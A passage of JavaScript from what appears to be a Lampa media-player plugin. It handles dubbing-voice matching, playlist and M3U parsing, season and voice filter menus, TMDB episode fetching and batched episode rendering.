    var commonWords = ['studio', 'студио', 'sound', 'саунд'];

    keywords1.forEach(function (keyword) {
      if (commonWords.indexOf(keyword) !== -1) hasCommonWords1 = true;
    });

    keywords2.forEach(function (keyword) {
      if (commonWords.indexOf(keyword) !== -1) hasCommonWords2 = true;
    });

    if (hasCommonWords1 && hasCommonWords2) {
      var maxKeywords = Math.max(keywords1.length, keywords2.length);
      var minKeywords = Math.min(keywords1.length, keywords2.length);

      return (maxKeywords > minKeywords) ? matches === maxKeywords : matches >= minKeywords;
    }
    return matches > 0 && matches >= Math.ceil(totalKeywords / 2);
  };
  this.findBestVoiceMatch = function (targetVoice, voiceList) {
    if (!targetVoice || !voiceList || !voiceList.length) return -1;

    var extractedVoice = this.extractVoiceFromBrackets(targetVoice);
    var searchPairs = [
      { voice: targetVoice, type: 'original' },
      { voice: extractedVoice, type: 'extracted' }
    ].filter(function (pair, index, arr) {
      return index === 0 || pair.voice !== arr[0].voice;
    });

    var searchMethods = [
      { name: 'exact', fn: this.equalTitle.bind(this) },
      {
        name: 'normalized', fn: function (target, candidate) {
          return this.normalizeVoiceName(target) === this.normalizeVoiceName(candidate);
        }.bind(this)
      },
      { name: 'algorithmic', fn: this.compareVoiceNames.bind(this) },
      {
        name: 'partial', fn: function (target, candidate) {
          if (target.length <= 3) return false;
          var targetLower = target.toLowerCase().trim();
          var candidateLower = candidate.toLowerCase().trim();
          return targetLower.includes(candidateLower) || candidateLower.includes(targetLower);
        }
      }
    ];

    for (var methodIndex = 0; methodIndex < searchMethods.length; methodIndex++) {
      var method = searchMethods[methodIndex];

      for (var pairIndex = 0; pairIndex < searchPairs.length; pairIndex++) {
        var searchPair = searchPairs[pairIndex];

        for (var i = 0; i < voiceList.length; i++) {
          var v = voiceList[i];
          var voiceName = this.getVoiceName(v);

          if (voiceName && method.fn(searchPair.voice, voiceName)) {
            return i;
          }
        }
      }
    }

    return -1;
  };
  this.getVoiceName = function (voice) {
    return typeof voice === 'object' ? (voice.title || voice.name) : voice;
  };
  this.findVoiceIdByName = function (voiceName, voiceList) {
    for (var i = 0; i < voiceList.length; i++) {
      var v = voiceList[i];
      if (typeof v === 'object' && this.getVoiceName(v) === voiceName) {
        return v.id;
      }
    }
    return null;
  };
  this.findVoiceIndexById = function (voiceId, voiceList) {
    for (var i = 0; i < voiceList.length; i++) {
      var v = voiceList[i];
      if (typeof v === 'object' && v.id == voiceId) {
        return i;
      }
    }
    return -1;
  };
  this.extractVoiceFromBrackets = function (targetVoice) {
    var bracketMatch = targetVoice.match(/\[([^\]]+)\]/);
    if (!bracketMatch) return targetVoice;

    var bracketContent = bracketMatch[1].trim();

    var cleanContent = bracketContent
      .replace(/\b(4K|HD|FHD|UHD|2K|720p|1080p|1440p|2160p)\b/gi, '')
      .replace(/^[,\s]+|[,\s]+$/g, '')
      .replace(/\s*,\s*/g, ', ')
      .trim();

    if (cleanContent.includes(',')) {
      var parts = cleanContent.split(',').map(function (p) { return p.trim(); });
      cleanContent = parts.reduce(function (longest, current) {
        return current.length > longest.length ? current : longest;
      });
    }

    return cleanContent && cleanContent !== bracketContent ? cleanContent : bracketContent;
  };
  this.parsePlaylist = function (str) {
    var pl = [];
    try {
      if (str.charAt(0) === '[') {
        str.substring(1).split(',[').forEach(function (item) {
          if (item.endsWith(',')) item = item.substring(0, item.length - 1);
          var label_end = item.indexOf(']');
          if (label_end >= 0) {
            var label = item.substring(0, label_end);
            if (item.charAt(label_end + 1) === '{') {
              item.substring(label_end + 2).split(';{').forEach(function (voice_item) {
                if (voice_item.endsWith(';')) voice_item = voice_item.substring(0, voice_item.length - 1);
                var voice_end = voice_item.indexOf('}');
                if (voice_end >= 0) {
                  var voice = voice_item.substring(0, voice_end);
                  pl.push({
                    label: label,
                    voice: voice,
                    links: voice_item.substring(voice_end + 1).split(' or ')
                  });
                }
              });
            } else {
              pl.push({
                label: label,
                links: item.substring(label_end + 1).split(' or ')
              });
            }
          }
          return null;
        });
      }
    } catch (e) { }
    return pl;
  };
  this.parseM3U = function (str) {
    var pl = [];

    try {
      var width = 0;
      var height = 0;
      str.split('\n').forEach(function (line) {
        if (line.charAt(0) == '#') {
          var resolution = line.match(/\bRESOLUTION=(\d+)x(\d+)\b/);

          if (resolution) {
            width = parseInt(resolution[1]);
            height = parseInt(resolution[2]);
          }
        } else if (line.trim().length) {
          pl.push({
            width: width,
            height: height,
            link: line
          });
          width = 0;
          height = 0;
        }
      });
    } catch (e) { }

    return pl;
  };
  this.decodeHtml = function (html) {
    var text = document.createElement("textarea");
    text.innerHTML = html;
    return text.value;
  };
  this.fixLink = function (link, proxy, referrer) {
    if (link) {
      if (!referrer || link.indexOf('://') !== -1) return proxy + link;
      var url = new URL(referrer);
      if (startsWith(link, '//')) return proxy + url.protocol + link;
      if (startsWith(link, '/')) return proxy + url.origin + link;
      if (startsWith(link, '?')) return proxy + url.origin + url.pathname + link;
      if (startsWith(link, '#')) return proxy + url.origin + url.pathname + url.search + link;
      var base = url.href.substring(0, url.href.lastIndexOf('/') + 1);
      return proxy + base + link;
    }

    return link;
  };
  this.similars = function (json) {
    var _this5 = this;
    scroll.clear();
    json.forEach(function (elem) {
      var info = [];
      var name = elem.title || elem.ru_title || elem.en_title || elem.nameRu || elem.nameEn;
      var orig = elem.orig_title || elem.nameEn || '';
      var year = ((elem.start_date || elem.year || '') + '').slice(0, 4);
      var transl = elem.translations ? String(elem.translations).split(',').slice(0, 2) : '';
      var count_s = elem.seasons_count ? elem.seasons_count + ' ' + Lampa.Lang.translate('torrent_serial_season').toLowerCase() + _this5.num_word(elem.seasons_count, ['', 'а', 'ов']) : '';
      var episodeForms = _this5.getEpisodeForms();
      var count_eps = elem.episodes_count ? elem.episodes_count + ' ' + _this5.num_word(elem.episodes_count, episodeForms) : '';
      if (year) info.push(year);
      if (orig && orig !== name) info.push(orig);
      if (elem.type) info.push(
        elem.type == ('TV' || 'tv-series' || 'serial' || 'MINI_SERIES') ? Lampa.Lang.translate('serial_word') :
        elem.type == 'TV_SHOW' ? Lampa.Lang.translate('tv_show') :
        elem.type == ('movie' || 'film' || 'FILM' || 'MOVIE') ? Lampa.Lang.translate('movie_word') : elem.type
      );
      if (count_s) info.push((count_s && ' - ' + count_s + ' из них ' + count_eps));
      if (!count_s && count_eps) info.push(count_eps);
      if (transl) info.push(transl);
      if (elem.rating && elem.rating !== 'null' && elem.filmId) info.push(Lampa.Template.get('modss_online_rate', {
        rate: elem.rating
      }, true));
      if (elem.quality && elem.quality.length) info.push(elem.quality);

      if (elem.countries && elem.countries.length) {
        info.push((elem.filmId ? elem.countries.map(function (c) {
          return c.country;
        }) : elem.countries.map(function (c) {
          return c.title || c;
        })).join(', '));
      }

      if (elem.categories && elem.categories.length) {
        //  info.push(elem.categories.slice(0, 4).join(', '));
      }

      elem.title = name;
      elem.time = elem.filmLength || '';
      elem.info = info.join('<span class="online_modss-split">●</span>');

      var item = Lampa.Template.get('modss_online_folder', elem);
      var img = elem.img || elem.image || elem.poster || false;
      if (img) {
        var image = $('<img style="height: 7em; width: 7em; border-radius: 0.3em;"/>');
        item.find('.online_modss__folder').empty().append(image);
        Lampa.Utils.imgLoad(image, img);
      }

      item.on('hover:enter', function () {
        //_this5.activity.loader(true);
        _this5.reset();
        if (balanser == 'videocdn') source.search(object, [elem]); else _this5.request(elem.url);
      }).on('hover:focus', function (e) {
        last = e.target;
        scroll.update($(e.target), true);
      });
      scroll.append(item);
    });
    Lampa.Controller.enable('content');
  };
  this.getChoice = function (for_balanser) {
    var data = Lampa.Storage.cache('online_choice_' + (for_balanser || balanser), 3000, {});
    var save = data[object.movie.id] || {};
    Lampa.Arrays.extend(save, {
      season: 0,
      voice: 0,
      order: 0,
      server: Lampa.Storage.get('pub_server', '1'),
      type: Lampa.Storage.get('pub_type_striming', for_balanser == 'hdr' ? 0 : 3),
      voice_name: '',
      voice_id: 0,
      episodes_view: {},
      movie_view: '',
      seasons: ''
    });
    return save;
  };
  this.saveChoice = function (choice, for_balanser) {
    var data = Lampa.Storage.cache('online_choice_' + (for_balanser || balanser), 3000, {});
    data[object.movie.id] = choice;
    Lampa.Storage.set('online_choice_' + (for_balanser || balanser), data);
  };
  this.replaceChoice = function (choice, for_balanser) {
    var to = this.getChoice(for_balanser);
    Lampa.Arrays.extend(to, choice, true);
    this.saveChoice(to, for_balanser);
  };
  this.clearImages = function () {
    images.forEach(function (img) {
      img.onerror = function () { };
      img.onload = function () { };
      img.src = '';
    });
    images = [];
  };
  this.reset = function () {
    last = false;
    allItemsToDisplay = [];
    allRenderedItems = [];
    seasonGroups = [];
    page = 0;
    isLoadingMore = false;
    targetScrollElement = false;
    items_need_add = [];
    added = 0;
    shouldLoadToLastWatched = false;
    clearInterval(balanser_timer);
    clearTimeout(number_of_requests_timer);
    clearTimeout(balancer_cache_empty_timer);
    balancer_cache_empty_retries = 0;
    clearTimeout(life_wait_timer);
    network.clear();
    this.clearImages();
    scroll.render().find('.empty').remove();
    scroll.clear();
    scroll.reset();
    scroll.body().append(Lampa.Template.get('modss_content_loading'));
  };
  this.loading = function (status) {
    if (status) this.activity.loader(true); else {
      this.activity.loader(false);
      this.activity.toggle();
    }
  };
  this.filter = function (filter_items, choice) {
    var _this6 = this;
    var select = [];
    var countEp = function countEp(data, s) {
      var result = {};
      for (var name in data) {
        if (data.hasOwnProperty(name)) {
          if (s === null) {
            result[name] = 0;
            for (var season in data[name]) {
              if (data[name].hasOwnProperty(season)) {
                result[name] += data[name][season] ? data[name][season].length : 0;
              }
            }
          } else {
            result[name] = data[name][s] ? data[name][s].length : 0;
          }
        }
      }
      return result;
    };

    var countVoic = function countVoic(data, season) {
      var count = 0;
      var types = [];
      
      // Проверяем есть ли типы видео в extract
      var dataKeys = Lampa.Arrays.getKeys(data);
      var isTypeBasedStructure = extract && extract.type && extract.type.length > 0;
      
      if (isTypeBasedStructure) {
        // Новая структура - считаем типы видео и собираем их названия
        dataKeys.forEach(function (type) {
          if (data[type] && data[type][season] && data[type][season].length > 0) {
            count++;
            types.push(type.toUpperCase());
          }
        });
      } else {
        // Старая структура
        Lampa.Arrays.getKeys(data).forEach(function (dub) {
          if (data[dub].hasOwnProperty(season) && balanser == 'hdr') {
            // Проверяем существование данных перед обращением к ним
            if (data[dub][season] && 
                Lampa.Arrays.isArray(data[dub][season]) && 
                data[dub][season].length > 0 && 
                data[dub][season][0] && 
                data[dub][season][0].voice) {
              count = data[dub][season][0].voice.split('<br>').length;
            }
          } else if (data[dub].hasOwnProperty(season)) count++;
        });
      }
      
      return { count: count, types: types, isTypeBasedStructure: isTypeBasedStructure };
    };

    var add = function add(type, title) {
      var need = _this6.getChoice();
      var items = filter_items[type];
      var subitems = [];
      var value = need ? need[type] : 0;

      var episodesBySeason = {};
      var currentVoice = need && need.voice !== undefined && filter_find.voice[need.voice] && (filter_find.voice[need.voice].name || filter_find.voice[need.voice].title) || (need && need.voice !== undefined ? filter_find.voice[need.voice] : null);

      if (extract && extract.season && extract.season.length && typeof extract.season[0] !== 'object') {
        // Проверяем структуру данных (может быть extract.folder или extract.episode)
        var extractItems = extract.folder || extract.episode;
        var extractKeys = extractItems ? Lampa.Arrays.getKeys(extractItems) : [];
        var isDirectSeasonMapping = extractKeys.length > 0 && extractKeys.every(function (key) {
          return !isNaN(key) && Lampa.Arrays.isArray(extractItems[key]);
        });

        if (isDirectSeasonMapping) {
          // Структура extractItems[season_number] - считаем эпизоды напрямую
          for (var seasonKey in extractItems) {
            if (extractItems.hasOwnProperty(seasonKey) && Lampa.Arrays.isArray(extractItems[seasonKey])) {
              episodesBySeason[seasonKey] = extractItems[seasonKey].length;
            }
          }
        } else if (currentVoice && extractItems && extractItems[currentVoice]) {
          // Стандартная структура extractItems[voice_name][season_number]
          for (var seasonKey in extractItems[currentVoice]) {
            if (extractItems[currentVoice].hasOwnProperty(seasonKey)) {
              var seasonEpisodes = extractItems[currentVoice][seasonKey];
              var episodeCount = 0;

              if (Lampa.Arrays.isArray(seasonEpisodes)) episodeCount = seasonEpisodes.length;
              else if (typeof seasonEpisodes === 'object' && seasonEpisodes !== null) {
                episodeCount = Object.keys(seasonEpisodes).length;
              }
              if (episodeCount > 0) episodesBySeason[seasonKey] = episodeCount;
            }
          }
        }
      }

      if (extract && extract.season && extract.season.length && type === 'season' && typeof extract.season[0] !== 'object') {
        var totalEpisodes = 0;

        // Проверяем структуру данных для подсчета эпизодов
        var extractItems = extract.folder || extract.episode;
        var extractKeys = extractItems ? Lampa.Arrays.getKeys(extractItems) : [];
        var isDirectSeasonMapping = extractKeys.length > 0 && extractKeys.every(function (key) {
          return !isNaN(key) && Lampa.Arrays.isArray(extractItems[key]);
        });

        if (isDirectSeasonMapping) {
          // Структура extractItems[season_number] - подсчитываем эпизоды напрямую
          for (var seasonKey in extractItems) {
            if (extractItems.hasOwnProperty(seasonKey) && Lampa.Arrays.isArray(extractItems[seasonKey])) {
              totalEpisodes += extractItems[seasonKey].length;
            }
          }
        } else {
          // Стандартная структура - используем старую логику
          for (var seasonKey in episodesBySeason) {
            if (episodesBySeason.hasOwnProperty(seasonKey)) {
              totalEpisodes += episodesBySeason[seasonKey];
            }
          }
        }

        subitems.push({
          title: Lampa.Lang.translate('all_seasons'),
          selected: value === -1,
          index: -1,
            subtitle: totalEpisodes > 0 ? (function() {
            var episodeForms = _this6.getEpisodeForms();
            return totalEpisodes + ' ' + _this6.num_word(totalEpisodes, episodeForms);
          })() : null
        });
      }

      items.forEach(function (name, i) {
        var displayTitle = (typeof name === 'object') ? (name.title || name.name || Lampa.Lang.translate('torrent_serial_season') + ' ' + (i + 1)) : name;
        var par = {
          title: displayTitle,
          selected: value === i,
          index: i
        };
        if (type === 'season') {
          var seasonKey = (typeof name === 'object') ? (displayTitle.split(' ').pop()) : name.split(' ').pop();

          // Проверяем структуру данных для подсчета
          var extractItems = extract.folder || extract.episode;
          var extractKeys = extractItems ? Lampa.Arrays.getKeys(extractItems) : [];
          var isDirectSeasonMapping = extractKeys.length > 0 && extractKeys.every(function (key) {
            return !isNaN(key) && Lampa.Arrays.isArray(extractItems[key]);
          });

          if (isDirectSeasonMapping) {
            // Структура extractItems[season_number] - показываем только количество эпизодов
            var episodeCount = extractItems[seasonKey] ? extractItems[seasonKey].length : 0;
            if (episodeCount > 0) {
              var episodeForms = _this6.getEpisodeForms();
              par.subtitle = episodeCount + ' ' + _this6.num_word(episodeCount, episodeForms);
            }
          } else {
            // Стандартная структура с озвучками
            var countResult = countVoic(extractItems, seasonKey);
            var counts = countResult.count;
            var types = countResult.types;
            var isTypeBasedStructure = countResult.isTypeBasedStructure;

            var episodesInfo = '';
            if (episodesBySeason && episodesBySeason[seasonKey]) {
              var episodeForms = _this6.getEpisodeForms();
              episodesInfo = episodesBySeason[seasonKey] + ' ' + _this6.num_word(episodesBySeason[seasonKey], episodeForms);
            }

            var subtitleParts = [];
            if (balanser !== 'hdrezka' && counts > 0) {
              // Для HDR балансера с типами видео показываем типы вместо озвучек
              if (balanser === 'hdr' && isTypeBasedStructure && types.length > 0) {
                subtitleParts.push(types.join(', '));
              } else {
                subtitleParts.push(counts + ' озвуч' + _this6.num_word(counts, ['ка', 'ки', 'ек']));
              }
            }
            if (episodesInfo) subtitleParts.push(episodesInfo);
            if (subtitleParts.length > 0) par.subtitle = subtitleParts.join(' • ');
          }
        }

        if (type === 'voice') {
          // Проверяем структуру данных
          var extractItems = extract.folder || extract.episode;
          var extractKeys = extractItems ? Lampa.Arrays.getKeys(extractItems) : [];
          var isDirectSeasonMapping = extractKeys.length > 0 && extractKeys.every(function (key) {
            return !isNaN(key) && Lampa.Arrays.isArray(extractItems[key]);
          });

          if (!isDirectSeasonMapping) {
            // Стандартная структура с озвучками
            var seasonKey = null;
            if (need && need.season === -1) {
              seasonKey = null;
            } else if (need && need.season >= 0 && filter_items.season) {
              var selectedSeason = filter_items.season[need.season];
              var seasonNumber = null;

              if (selectedSeason != null) {
                if (typeof selectedSeason === 'object') {
                  var seasonTitle = selectedSeason.title || selectedSeason.name || '';
                  seasonNumber = seasonTitle ? String(seasonTitle).split(' ').pop() : null;
                } else {
                  seasonNumber = String(selectedSeason).split(' ').pop();
                }
              }
              var testSeasonKeys = [seasonNumber, (parseInt(seasonNumber) - 1).toString()];
              for (var i = 0; i < testSeasonKeys.length; i++) {
                var testKey = testSeasonKeys[i];
                var hasData = false;
                for (var voiceName in extractItems) {
                  if (extractItems[voiceName] && extractItems[voiceName][testKey]) {
                    hasData = true;
                    break;
                  }
                }
                if (hasData) {
                  seasonKey = testKey;
                  break;
                }
              }
              if (seasonKey === null) seasonKey = seasonNumber;
            }

            var counts = countEp(extractItems, seasonKey);
            if (balanser !== 'hdrezka' && counts[name] !== undefined && counts[name] > 0) {
              par.template = 'selectbox_icon';
              par.icon = '<svg style="margin-left:-0.7em;width:1.5em!important;height:2.8em!important" width="24" height="31" viewBox="0 0 24 31" fill="none" xmlns="http://www.w3.org/2000/svg"><rect x="5" width="14" height="23" rx="7" fill="currentColor"></rect><path d="M3.39272 18.4429C3.08504 17.6737 2.21209 17.2996 1.44291 17.6073C0.673739 17.915 0.299615 18.7879 0.607285 19.5571L3.39272 18.4429ZM23.3927 19.5571C23.7004 18.7879 23.3263 17.915 22.5571 17.6073C21.7879 17.2996 20.915 17.6737 20.6073 18.4429L23.3927 19.5571ZM0.607285 19.5571C2.85606 25.179 7.44515 27.5 12 27.5V24.5C8.55485 24.5 5.14394 22.821 3.39272 18.4429L0.607285 19.5571ZM12 27.5C16.5549 27.5 21.1439 25.179 23.3927 19.5571L20.6073 18.4429C18.8561 22.821 15.4451 24.5 12 24.5V27.5Z" fill="currentColor"></path><rect x="10" y="25" width="4" height="6" rx="2" fill="currentColor"></rect></svg>';
              var episodeForms = _this6.getEpisodeForms();
              par.subtitle = Lampa.Lang.translate('voice_dubbed') + counts[name] + ' ' + _this6.num_word(counts[name], episodeForms);
              par.find = counts[name] > 0;
            }
          }
        }

        if (type === 'type') {
          // Подсчет серий для типов видео в выбранном сезоне
          var extractItems = extract.folder || extract.episode;
          var isTypeBasedStructure = extract && extract.type && extract.type.length > 0;
          
          if (isTypeBasedStructure && extractItems && extractItems[name]) {
            // Получаем выбранный сезон
            var selectedSeason = null;
            if (need && need.season >= 0 && filter_items.season && filter_items.season[need.season]) {
              var seasonObj = filter_items.season[need.season];
              if (typeof seasonObj === 'object') {
                selectedSeason = (seasonObj.title || seasonObj.name || '').split(' ').pop();
              } else {
                selectedSeason = seasonObj.split(' ').pop();
              }
            }
            
            // Показываем серии только для выбранного сезона
            if (selectedSeason && extractItems[name][selectedSeason]) {
              var episodeCount = Lampa.Arrays.isArray(extractItems[name][selectedSeason]) 
                ? extractItems[name][selectedSeason].length 
                : 0;
              
                if (episodeCount > 0) {
                 var episodeForms = _this6.getEpisodeForms();
               par.subtitle = episodeCount + ' ' + _this6.num_word(episodeCount, episodeForms);
                }
            }
          }
        }
        
        subitems.push(par);
      });

      // Получаем корректный subtitle для отображения
      var subtitle = '';
      if (type === 'season' && value === -1) {
        subtitle = Lampa.Lang.translate('all_seasons');
      } else if (items[value]) {
        if (typeof items[value] === 'object') {
          subtitle = items[value].title || items[value].name || '';
        } else {
          subtitle = items[value];
        }
      }

      select.push({
        title: title,
        subtitle: subtitle,
        items: subitems,
        stype: type
      });
    };

    filter_items.source = filter_sources;
    select.push({
      title: Lampa.Lang.translate('torrent_parser_reset'),
      reset: true
    }, {
      title: Lampa.Lang.translate('modss_balanser'),
      subtitle: sources[balanser].name,
      bal: true
    });
    this.saveChoice(choice);
    if (filter_items.season && filter_items.season.length) add('season', Lampa.Lang.translate('torrent_serial_season'));
    if (filter_items.voice && filter_items.voice.length) add('voice', Lampa.Lang.translate('torrent_parser_voice'));
    if (filter_items.type && filter_items.type.length) add('type', Lampa.Lang.translate('filter_video_stream') + '');
    if (!Lampa.Storage.get('pro_pub', 'false') && filter_items.server && filter_items.server.length) add('server', Lampa.Lang.translate('filter_video_server') + '');
    if (filter_items.order && filter_items.order.length) add('order', Lampa.Lang.translate('filter_series_order') + '');

    filter.set('filter', select);
    filterSelectItems = select;
    this.updateSourcesFilter();

    this.selected(filter_items);
  };
  this.selected = function (filter_items) {
    var need = this.getChoice(), select = [];
    if (need) {
      for (var i in need) {
        if (filter_items[i] && filter_items[i].length) {
          var item = filter_items[i][need[i]];
          var displayText = '';

          if (typeof item === 'object') {
            displayText = item.title || item.name || item;
          } else {
            displayText = item;
          }

          if (i == 'voice') {
            select.push(filter_translate[i] + ': ' + displayText);
          } else if (i !== 'source') {
            if (filter_items.season.length >= 1) {
              select.push(filter_translate.season + ': ' + displayText);
            }
          }
        }
      }
    }

    filter.chosen('filter', select);
    filter.chosen('sort', [sources[balanser].name.split(' ')[0]]);
  };
  this.getEpisodes = function (season, choice, call) {
    var episodes = [];
    if (typeof object.movie.id !== 'number' || !object.movie.name) return call(episodes);

    var fetchSeasonEpisodes = function (seasonNum) {
      return new Promise(function (resolve) {
        Lampa.Api.sources.tmdb.get('tv/' + object.movie.id + '/season/'+seasonNum, {}, function(data){
          var seasonEpisodes = data.episodes || [];
          resolve({ season: seasonNum, episodes: seasonEpisodes });
        }, function () {
          resolve({ season: seasonNum, episodes: [] });
        });
      });
    };

    if (object.movie.source == 'pub') {
      var baseurl = Pub.baseurl + 'v1/items/' + object.movie.id + '?access_token=' + Pub.token;
      network.timeout(1000 * 10);
      network["native"](baseurl, function (data) {
        var seasons = data.item && data.item.seasons || [];
        if (choice.season === -1) {
          // Для "Все сезоны" возвращаем все сезоны
          episodes = seasons.map(function (s) {
            return {
              season: s.number,
              episodes: s.episodes || []
            };
          });
          call(episodes);
        } else {
          var seasonData = seasons.find(function (s) {
            return s.number == season;
          });
          episodes = seasonData && seasonData.episodes || [];
          call(episodes);
        }
      }, function () {
        call(episodes);
      });
    } else {
      fetchSeasonEpisodes(season).then(function (result) {
        episodes = result.episodes;
        call(episodes);
      }).catch(function () {
        call(episodes);
      });
    }
  };
  this.draw = function (items) {
    var _this4 = this;
    var params = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : {};
    var choice = _this4.getChoice();
    if (!items.length) return this.empty();

    // Инициализируем новую систему пагинации
    items_need_add = items;
    added = 0;
    allRenderedItems = [];

    scroll.clear();
    scroll.append(Lampa.Template.get('modss_online_watched', {}));

    this.updateWatched();
    var seasonForEpisodes = items[0] ? items[0].season : 1;
    this.getEpisodes(seasonForEpisodes, choice, function (episodes) {
    
      _this4.cachedEpisodes = episodes;
      _this4.cachedParams = params;
      
      // Загружаем элементы с учетом последней просмотренной серии
      _this4.loadItemsToLastWatched();
    });
  };
  this.loadItemsToLastWatched = function () {
    var _this4 = this;
    var choice = _this4.getChoice();
    var serial = object.movie.name ? true : false;
    
    var lastWatchedEpisode = 0;
    if (serial && items_need_add.length > 0) {
      var currentSeason = items_need_add[0].season;
      lastWatchedEpisode = choice.episodes_view[currentSeason] || 0;
    }
    var lastWatchedIndex = -1;
    if (lastWatchedEpisode > 0) {
      for (var i = 0; i < items_need_add.length; i++) {
        if (items_need_add[i].episode && items_need_add[i].episode >= lastWatchedEpisode) {
          lastWatchedIndex = i;
          break;
        }
      }
    }
    
    var minItemsToLoad = BATCH_SIZE;
    if (lastWatchedIndex > 0) {
      // Если нашли последнюю просмотренную серию, загружаем до неё + еще одну партию
      minItemsToLoad = Math.min(lastWatchedIndex + BATCH_SIZE, items_need_add.length);
    }
    // Загружаем элементы пока не достигнем нужного количества
    this.loadItemsBatch(minItemsToLoad);
  };
  this.loadItemsBatch = function (targetCount) {
    var _this4 = this;
    
    if (added >= items_need_add.length) {
      return _this4.finishLoading();
    }
    
    var itemsToLoad = Math.min(BATCH_SIZE, items_need_add.length - added, targetCount - added);
    var nextBatch = items_need_add.slice(added, added + itemsToLoad);
    
    nextBatch.forEach(function (element) {
      _this4.appendEpisode(element, _this4.cachedEpisodes, _this4.getChoice(), items_need_add, _this4.cachedParams);
      added++;
    });
    
    if (added < targetCount && added < items_need_add.length) {
      setTimeout(function () {
        _this4.loadItemsBatch(targetCount);
      }, 10);
    } else _this4.finishLoading();
  };
  this.loadMoreItems = function () {
    var _this4 = this;
    
    if (added >= items_need_add.length) return;
    
    var nextBatch = items_need_add.slice(added, added + BATCH_SIZE);
    nextBatch.forEach(function (element) {
      _this4.appendEpisode(element, _this4.cachedEpisodes, _this4.getChoice(), items_need_add, _this4.cachedParams, true);
      added++;
    });
  };
  this.finishLoading = function () {
    var _this4 = this;
    var serial = object.movie.name ? true : false;
    // Добавляем недостающие эпизоды только когда все элементы загружены
    if (added >= items_need_add.length && serial && !_this4.cachedParams.similars && _this4.getChoice().season !== -1 && _this4.cachedEpisodes.length > items_need_add.length) {
      var left = _this4.cachedEpisodes.slice(items_need_add.length);
      left.forEach(function (episode) {
        _this4.appendMissingEpisode(episode, items_need_add[0] ? items_need_add[0].season : 1);
      });
    }
    
    _this4.activity.loader(false);

    setTimeout(function () {
      Lampa.Controller.enable('content');
    }, 100);
  };
  this.appendMissingEpisode = function (episode, season) {
    var info = [];
    if (episode.vote_average) info.push(Lampa.Template.get('modss_online_rate', {
      rate: parseFloat(episode.vote_average + '').toFixed(1)
    }, true));
    if (episode.air_date) info.push(Lampa.Utils.parseTime(episode.air_date).full);
    var air = new Date((episode.air_date + '').replace(/-/g, '/'));
    var now = Date.now();
    var day = Math.round((air.getTime() - now) / (24 * 60 * 60 * 1000));
    var txt = day > 0 ? (Lampa.Lang.translate('full_episode_days_left') + ': ' + day) : Lampa.Lang.translate('voice_not_available');
    var html = Lampa.Template.get('modss_online_full', {
      serv: (episode.serv ? episode.serv : ''),
      bitrate: '',
      time: Lampa.Utils.secondsToTime((episode ? episode.runtime : object.movie.runtime) * 60, true),
      info: info.length ? info.map(function (i) {
        return '<span>' + i + '</span>';
      }).join('<span class="online_modss-split">●</span>') : '',
      title: episode.name || (Lampa.Lang.translate('episode_prefix') + (episode.episode_number || episode.number)),
      quality: txt
    });

    var loader = html.find('.online_modss__loader');
    var image = html.find('.online_modss__img');
    html.find('.online_modss__timeline').append(Lampa.Timeline.render(Lampa.Timeline.view(Lampa.Utils.hash([season, episode.episode_number, object.movie.original_title].join('')))));
    var img = html.find('img')[0];

    if (episode.still_path) {
      img.onerror = function () {
        img.src = './img/img_broken.svg';
      };

      img.onload = function () {
        image.addClass('online_modss__img--loaded');
        loader.remove();
        image.append('<div class="online_modss__episode-number">' + ('0' + episode.episode_number).slice(-2) + '</div>');
      };

      img.src = Lampa.TMDB.image('t/p/w300' + episode.still_path);
    } else {
      loader.remove();
      image.append('<div class="online_modss__episode-number">' + ('0' + episode.episode_number).slice(-2) + '</div>');
    }

    html.on('hover:focus', function (e) {
      last = e.target;
      scroll.update($(e.target), true);
    });
    html.css('opacity', '0.3');
    scroll.append(html);
  };
  this.appendSeason = function (seasonNumber) {
    if (object.movie.number_of_seasons) {
      scroll.append(
        Lampa.Template.get('modss_online_season', {
          season: Lampa.Lang.translate('torrent_serial_season') + ' ' + seasonNumber,
        })
      );
    }
  };
  this.new_seria = function () {
    if (object.movie.number_of_seasons) {
      setTimeout(function () {
        $('.card--new_ser, .card--viewed, .full-start__right .time-line, .card--last_view').remove();
        if ($('body').find('.online').length !== 0) {
          if ($('body').find('.online:last-child .torrent-item__viewed').length == 1 || $('body').find('.online:last-child .time-line.hide').length == 0) $('body').find('.full-start__poster').append("<div class='card--viewed' style='right: -0.6em;position: absolute;background: #168FDF;color: #fff;top: 0.8em;padding: 0.4em 0.4em;font-size: 1.2em;-webkit-border-radius: 0.3em;-moz-border-radius: 0.3em;border-radius: 0.3em;'>" + Lampa.Lang.translate('online_viewed') + "</div>");
          else $('body').find('.full-start__poster').append("<div class='card--new_ser' style='right: -0.6em;position: absolute;background: #168FDF;color: #fff;top: 0.8em;padding: 0.4em 0.4em;font-size: 1.2em;-webkit-border-radius: 0.3em;-moz-border-radius: 0.3em;border-radius: 0.3em;'>" + Lampa.Lang.translate('season_new') + " " + Lampa.Lang.translate('torrent_serial_episode') + "</div>");
        }
        //Modss.last_view(object.movie);
      }, 50);
    }
  };
  this.watched = function (set) {
    var file_id = Lampa.Utils.hash(object.movie.number_of_seasons ? object.movie.original_name : object.movie.original_title);
    var watched = Lampa.Storage.cache('online_watched_last', 5000, {});

    if (set) {
      if (!watched[file_id]) watched[file_id] = {};
      Lampa.Arrays.extend(watched[file_id], set, true);
      Lampa.Storage.set('online_watched_last', watched);
      this.updateWatched();
    } else {
      return watched[file_id];
    }
  };
  this.updateWatched = function () {
    var watched = this.watched();
    var body = scroll.body().find('.online-modss-watched .online-modss-watched__body').empty();

    if (watched) {
      var line = [];
      if (watched.balanser_name) line.push(watched.balanser_name);
      if (watched.voice_name) line.push(watched.voice_name);
      if (watched.season) line.push(Lampa.Lang.translate('torrent_serial_season') + ' ' + watched.season);
      if (watched.episode) line.push(Lampa.Lang.translate('torrent_serial_episode') + ' ' + watched.episode);
      line.forEach(function (n) {
        body.append('<span>' + n + '</span>');
      });
    } else body.append('<span>' + Lampa.Lang.translate('online_no_watch_history') + '</span>');
  };
  this.getEpisodeForms = function () {
    var result = ['эпизод', 'эпизода', 'эпизодов'];
    return [result[0], result[1], result[2]];
  };
  this.num_word = function (value, words) {
    value = Math.abs(value) % 100;
    var num = value % 10;
    if (value > 10 && value < 20) return words[2];
    if (num > 1 && num < 5) return words[1];
    if (num == 1) return words[0];
    return words[2];
  };
  this.order = [{ title: Lampa.Lang.translate('order_standard'), id: 'normal' }, { title: Lampa.Lang.translate('order_invert'), id: 'invers' }];
  this.contextMenu = function (params) {
    var _self = this;
    var buildQualityArray = function(quality, qualityReserve) {
      var qual = [];
